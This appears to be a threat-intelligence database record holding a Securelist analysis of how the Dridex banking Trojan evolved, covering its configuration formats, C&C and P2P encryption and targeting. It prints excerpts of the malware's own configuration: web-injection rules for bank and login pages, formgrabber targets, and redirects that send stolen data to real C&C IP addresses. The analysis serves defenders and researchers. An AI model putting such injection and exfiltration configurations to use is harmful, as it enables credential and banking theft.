{
    "id": "44210d2b-2cd0-4850-b0e2-f960fd3873c1",
    "created_at": "2023-01-12T15:08:49.158076Z",
    "updated_at": "2025-03-27T02:15:38.079711Z",
    "deleted_at": null,
    "sha1_hash": "a80940856347986b7df7809e43c90bb9728359f7",
    "title": "2017-05-25 - Dridex- A History of Evolution",
    "authors": "",
    "file_creation_date": "2022-09-01T10:31:38Z",
    "file_modification_date": "2022-09-01T10:31:38Z",
    "file_size": 1656736,
    "plain_text": "# Dridex: A History of Evolution\n\n**securelist.com/analysis/publications/78531/dridex-a-history-of-evolution/**\n\nAuthors\n\nNikita Slepogin\n\nThe Dridex banking Trojan, which has become a major financial cyberthreat in the past years (in 2015, the damage done by the\n[Trojan was estimated at over $40 million), stands apart from other malware because it has continually evolved and become more](https://www.theregister.co.uk/2015/10/14/dridex_botnet_takedown/)\nsophisticated since it made its first appearance in 2011. Dridex has been able to escape justice for so long by hiding its main\ncommand-and-control (C&C) servers behind proxying layers. Given that old versions stop working when new ones appear and that\neach new improvement is one more step forward in the systematic development of the malware, it can be concluded that the same\npeople have been involved in the Trojan’s development this entire time. Below we provide a brief overview of the Trojan’s evolution\nover six years, as well as some technical details on its latest versions.\n\n\n-----\n\n## How It All Began\n\nDridex made its first appearance as an independent malicious program (under the name “Cridex”) around September 2011. An\nanalysis of a Cridex sample (MD5: 78cc821b5acfc017c855bc7060479f84) demonstrated that, even in its early days, the malware\ncould receive dynamic configuration files, use web injections to steal money, and was able to infect USB media. This ability\ninfluenced the name under which the “zero” version of Cridex was detected — Worm.Win32.Cridex.\n\nThat version had a binary configuration file:\n\nSections named databefore, datainject, and dataafter made the web injections themselves look similar to the widespread Zeus\nmalware (there may have been a connection between this and the 2011 Zeus source code leak).\n\n## Cridex 0.77–0.80\n\nIn 2012, a significantly modified Cridex variant (MD5: 45ceacdc333a6a49ef23ad87196f375f) was released. The cybercriminals had\ndropped functionality related to infecting USB media and replaced the binary format of the configuration file and packets with XML.\nRequests sent by the malware to the C&C server looked as follows:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\n<message set_hash= req_set= 1 req_upd= 1 >\n\n<header>\n\n<unique>WIN-1DUOM1MNS4F_A47E8EE5C9037AFE</unique>\n\n<version>600</version>\n\n<system>221440</system>\n\n<network>10</network>\n\n</header>\n\n<data></data>\n\n</message>\n\n\nThe <message> tag was the XML root element. The <header> tag contained information about the system, bot identifier, and the\nversion of the bot.\n\nHere is a sample configuration file:\n\n\n1\n\n2\n\n3\n\n4\n\n\n<packet><commands><cmd id=\"1354\" type=\"3\"><httpinject><conditions><url type=\"deny\">\\.(css|js)($|\\?)</url><url\ntype=\"allow\" contentType=\"^text/(html|plain)\"><![CDATA[https://.*?\\.usbank\\.com/]]></url></conditions><actions><modify>\n<pattern><![CDATA[<body.*?>(.*?)]]></pattern><replacement><![CDATA[<link\nhref=\"https://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/base/jquery-ui.css\" rel=\"stylesheet\" type=\"text/css\"/>\n\n<style type=\"text/css\">\n\n.ui-dialog-titlebar{ background: white }\n\n.text1a{font-family: Arial; font-size: 10px;}\n\n\nWith the exception of the root element <packet>, the Dridex 0.8 configuration file remained virtually unchanged until version 3.0.\n\n## Dridex 1.10\n\n[The “zero” version was maintained until June 2014. A major operation (Operation Tovar) to take down another widespread](https://krebsonsecurity.com/2014/06/operation-tovar-targets-gameover-zeus-botnet-cryptolocker-scourge/)\nmalicious program — Gameover Zeus — was carried out that month. Nearly as soon as Zeus was taken down, the “zero” version of\nCridex stopped working and Dridex version 1.100 appeared almost exactly one month afterward (on June 22).\n\n\n-----\n\nSample configuration file:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n\n<root>\n\n<settings hash=\"65762ae2bf50e54757163e60efacbe144de96aca\">\n\n<httpshots>\n\n<url type=\"deny\" onget=\"1\" onpost=\"1\">\\.(gif|png|jpg|css|swf|ico|js)($|\\?)</url>\n\n<url type=\"deny\" onget=\"1\" onpost=\"1\">(resource\\.axd|yimg\\.com)</url>\n\n</httpshots>\n\n<formgrabber>\n\n<url type=\"deny\">\\.(swf)($|\\?)</url><url type=\"deny\">/isapi/ocget.dll</url>\n\n<url type=\"allow\">^https?://aol.com/.*/login/</url>\n\n<url type=\"allow\">^https?://accounts.google.com/ServiceLoginAuth</url>\n\n<url type=\"allow\">^https?://login.yahoo.com/</url>\n\n...\n\n<redirects>\n\n<redirect name=\"1st\" vnc=\"0\" socks=\"0\" uri=\"http://81.208.13.10:8080/injectgate\" timeout=\"20\">twister5.js</redirect>\n\n<redirect name=\"2nd\" vnc=\"1\" socks=\"1\" uri=\"http://81.208.13.10:8080/tokengate\" timeout=\"20\">mainsc5.js</redirect>\n\n<redirect name=\"vbv1\" vnc=\"0\" socks=\"0\" postfwd=\"1\" uri=\"http://23.254.129.192:8080/logs/dtukvbv/js.php\"\ntimeout=\"20\">/logs/dtukvbv/js.php</redirect>\n\n<redirect name=\"vbv2\" vnc=\"0\" socks=\"0\" postfwd=\"1\" uri=\"http://23.254.129.192:8080/logs/dtukvbv/in.php\"\ntimeout=\"20\">/logs/dtukvbv/in.php</redirect>\n\n</redirects>\n\n<httpinjects>\n\n<httpinject><conditions>\n\n<url type=\"allow\" onpost=\"1\" onget=\"1\" modifiers=\"U\"><![CDATA[^https\\://.*/tdsecure/intro\\.jsp.*]]></url>\n\n<url type=\"deny\" onpost=\"0\" onget=\"1\" modifiers=\"\">\\.(gif|png|jpg|css|swf)($|\\?)</url>\n\n</conditions>\n\n<actions>\n\n<modify><pattern modifiers=\"msU\"><![CDATA[onKeyDown\\=\".*\"]]></pattern><replacement><![CDATA[onKeyDown=\"\"]]>\n</replacement></modify>\n\n<modify><pattern modifiers=\"msU\"><![CDATA[(\\<head.*\\>)]]></pattern><replacement><![CDATA[\\1<style type=\"text/css\">\n\nbody {visibility: hidden; }\n\n</style>\n\n...\n\n\nThis sample already has redirects for injected .js scripts that are characteristic of Dridex.\n\nHere is a comparison between Dridex and Gameover Zeus injections:\n\n\n-----\n\nThus, the takedown of one popular botnet (Gameover Zeus) led to a breakthrough in the development of another, which had many\nstrong resemblances to its predecessor.\n\nWe mentioned above that Dridex had begun to use PCRE, while its previous versions used SLRE. Remarkably, the only other\nbanking malware that also used SLRE was Trojan-Banker.Win32.Shifu. That Trojan was discovered in August 2015 and was\ndistributed through spam via the same botnets as Dridex. Additionally, both banking Trojans used XML configuration files.\n\nWe also have reasons to believe that, at least in 2014, the cybercriminals behind Dridex were Russian speakers. This is supported\nby comments in the command & control server’s source code:\n\nAnd by the database dumps:\n\n## Dridex: from Version 2 to Version 3\n\n\n-----\n\nBy early 2015, Dridex implemented a kind of P2P network, which is also reminiscent of the Gameover Zeus Trojan. On that\nnetwork, some peers (supernodes) had access to the C&C and forwarded requests from other network nodes to it. The\nconfiguration file was still stored in XML format, but it got a new section, <nodes>, which contained an up-to-date peer list.\nAdditionally, the protocol used for communication with the C&C was encrypted.\n\n## Dridex: from Version 3 to Version 4\n\nOne of the administrators of the Dridex network was arrested on August 28, 2015. In the early days of September, networks with\nidentifiers 120, 200, and 220 went offline. However, they came back online in October and new networks were added: 121, 122,\n123, 301, 302, and 303.\n\nNotably, the cybercriminals stepped up security measures at that time. Specifically, they introduced geo-filtering wherein an IP field\nappeared in C&C request packets, which was then used to identify the peer’s country. If it was not on the list of target countries, the\npeer received an error message.\n\nIn 2016, the loader became more complicated and encryption methods were changed. A binary loader protocol was introduced,\nalong with a <settings> section, which contained the configuration file in binary format.\n\n## Dridex 4.x. Back to the Future\n\n[The fourth version of Dridex was detected in early 2017. It has capabilities similar to the third version, but the cybercriminals](https://securityintelligence.com/dridexs-cold-war-enter-atombombing/)\nstopped using the XML format in the configuration file and packets and went back to binary. The analysis of new samples is\nrendered significantly more difficult by the fact that the loader now works for two days, at most. This is similar to Lurk, except that\nLurk’s loader was only active for a couple of hours.\n\n### Analyzing the Loader’s Packets\n\nThe packet structure in the fourth version is similar to those in the late modifications of the loader’s 3.x versions. However, the\nnames of the modules requested have been replaced with hashes:\n\nHere is the function that implements C&C communication and uses these hashes:\n\n\n-----\n\nKnowing the packet structure in the previous version, one can guess which hash relates to which module by comparing packets\nfrom the third and fourth versions.\n\nIn the fourth version of Dridex, there are many places where the CRC32 hashing algorithm is used, including hashes used to\nsearch for function APIs and to check packet integrity. It would make sense for hashes used in packets to be none other than\nCRC32 of requested module names. This assumption can easily be verified by running the following Python code:\n\nThat’s right – the hashes obtained this way are the same as those in the program’s code.\n\nWith regards to encryption of the loader’s packets, nothing has changed. As in Dridex version 3, the RC4 algorithm is used, with a\nkey stored in encrypted form in the malicious program’s body.\n\nOne more change introduced in the fourth version is that a much stricter loader authorization protocol is now used. A loader’s\nlifespan has been reduced to one day, after which encryption keys are changed and old loaders become useless. The server\nresponds to requests from all outdated samples with error 404.\n\n### Analysis of the Bot’s Protocol and Encryption\n\n\n-----\n\nEssentially, the communication of Dridex version 4 with its C&C is based on the same procedure as before, with peers still acting as\nproxy servers and exchanging modules. However, encryption and packet structure have changed significantly; now a packet looks\nlike the <settings> section from the previous Dridex version. No more XML.\n\nThe Basic Packet Generation function is used to create packets for communication with the C&C and with peers. There are two\ntypes of packets for the C&C:\n\n1. Registration and transfer of the generated public key\n2. Request for a configuration file\n\nThe function outputs the following packet:\n\nA packet begins with the length of the RC4 key (74h) that will be used to encrypt strings in that packet. This is followed by two parts\nof the key that are the same size. The actual key is calculated by performing XOR on these blocks. Next comes the packet type\n(00h) and encrypted bot identifier.\n\n### Peer-to-Peer Encryption\n\nSample encrypted P2P packet:\n\n\n-----\n\nThe header of a P2P packet is a DWORD array, the sum of all elements in which is zero. The obfuscated data size is the same as\nin the previous version, but the data is encrypted differently:\n\nThe packet begins with a 16-byte key, followed by 4 bytes of information about the size of data encrypted with the previous key\nusing RC4. Next comes a 16-byte key and data that has been encrypted with that key using RC4. After decryption we get a packet\ncompressed with gzip.\n\n### Peer to C&C Encryption\n\nAs before, the malware uses a combination of RSA, RC4 encryption, and HTTPS to communicate with the C&C. In this case, peers\nwork as proxy servers. An encrypted packet has the following structure: 4-byte CRC, followed by RSA_BLOB. After decrypting RSA\n(request packets cannot be decrypted without the C&C private key), we get a GZIP packet.\n\n### Configuration File\n\nWe have managed to obtain and decrypt the configuration file of botnet 222:\n\n\n-----\n\nIt is very similar in structure to the <settings> section from the previous version of Dridex. It begins with a 4-byte hash, which is\nfollowed by the configuration file’s sections.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n\nstruct DridexConfigSection {\n\nBYTE SectionType;\n\nDWORD DataSize;\n\nBYTE Data[DataSize];\n\n};\n\n\nThe sections are of the same types as in <settings>:\n\n01h – HttpShots\n02h – Formgrabber\n08h – Redirects\netc.\n\nThe only thing that has changed is the encryption of strings in the configuration file – RC4 is now used.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n\nstruct EncryptedConfigString{\n\nBYTE RC4Key1[16]; // Size's encryption key\n\nDWORD EncryptedSize;\n\nBYTE RC4Key2[16]; // Data's encryption key\n\nBYTE EncryptedData[Size];\n\n};\n\n\nRC4 was also used to encrypt data in p2p packets.\n\n### Geographical Distribution\n\n\n-----\n\nThe developers of Dridex look for potential victims in Europe. Between January 1st and early April 2017, we detected Dridex activity\nin several European countries. The UK accounted for more than half (nearly 60%) of all detections, followed by Germany and\nFrance. At the same time, the malware never works in Russia, as the C&Cs detect the country via IP address and do not respond if\nthe country is Russia.\n\n## Conclusion\n\nIn the several years that the Dridex family has existed, there have been numerous unsuccessful attempts to block the botnet’s\nactivity. The ongoing evolution of the malware demonstrates that the cybercriminals are not about to bid farewell to their brainchild,\nwhich is providing them with a steady revenue stream. For example, Dridex developers continue to implement new techniques for\nevading the User Account Control (UAC) system. These techniques enable the malware to run its malicious components on\nWindows systems.\n\nIt can be surmised that the same people, possibly Russian speakers, are behind the Dridex and Zeus Gameover Trojans, but we do\nnot know this for a fact. The damage done by the cybercriminals is also impossible to assess accurately. Based on a very rough\nestimate, it has reached hundreds of millions of dollars by now. Furthermore, given the way that the malware is evolving, it can be\nassumed that a significant part of the “earnings” is reinvested into the banking Trojan’s development.\n\nThe analysis was performed based on the following samples:\n\n**Dridex4 loader: d0aa5b4dd8163eccf7c1cd84f5723d48**\n\n**Dridex4 bot: ed8cdd9c6dd5a221f473ecf3a8f39933**\n\n[Botnets](https://securelist.com/tag/botnets/)\n[Financial malware](https://securelist.com/tag/financial-malware/)\n[Malware Descriptions](https://securelist.com/tag/malware-descriptions/)\n[Malware Technologies](https://securelist.com/tag/malware-technologies/)\n[Trojan Banker](https://securelist.com/tag/trojan-banker/)\n\nAuthors\n\nNikita Slepogin\n\nDridex: A History of Evolution\n\n\n-----\n\nYour email address will not be published. Required fields are marked\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-05-25 - Dridex- A History of Evolution.pdf"
    ],
    "report_names": [
        "2017-05-25 - Dridex- A History of Evolution.pdf"
    ],
    "threat_actors": [
        {
            "id": "4632103e-8035-4a83-9ecb-c1e12e21288c",
            "created_at": "2022-10-25T16:07:23.542255Z",
            "updated_at": "2025-03-27T02:02:09.854487Z",
            "deleted_at": null,
            "main_name": "DNSpionage",
            "aliases": [],
            "source_name": "ETDA:DNSpionage",
            "tools": [
                "Agent Drable",
                "AgentDrable",
                "CACTUSPIPE",
                "DNSpionage",
                "DropperBackdoor",
                "Karkoff",
                "MailDropper",
                "OILYFACE"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dcba8e2b-93e0-4d6e-a15f-5c44faebc3b1",
            "created_at": "2022-10-25T16:07:23.816991Z",
            "updated_at": "2025-03-27T02:02:09.991944Z",
            "deleted_at": null,
            "main_name": "Lurk",
            "aliases": [],
            "source_name": "ETDA:Lurk",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8d76e350-dfb5-4733-800d-876de41f690d",
            "created_at": "2023-01-06T13:46:38.841887Z",
            "updated_at": "2025-03-27T02:00:02.932838Z",
            "deleted_at": null,
            "main_name": "DNSpionage",
            "aliases": [
                "COBALT EDGEWATER"
            ],
            "source_name": "MISPGALAXY:DNSpionage",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536129,
    "ts_updated_at": 1743041738,
    "ts_creation_date": 1662028298,
    "ts_modification_date": 1662028298,
    "files": {
        "pdf": "https://archive.orkl.eu/a80940856347986b7df7809e43c90bb9728359f7.pdf",
        "text": "https://archive.orkl.eu/a80940856347986b7df7809e43c90bb9728359f7.txt",
        "img": "https://archive.orkl.eu/a80940856347986b7df7809e43c90bb9728359f7.jpg"
    }
}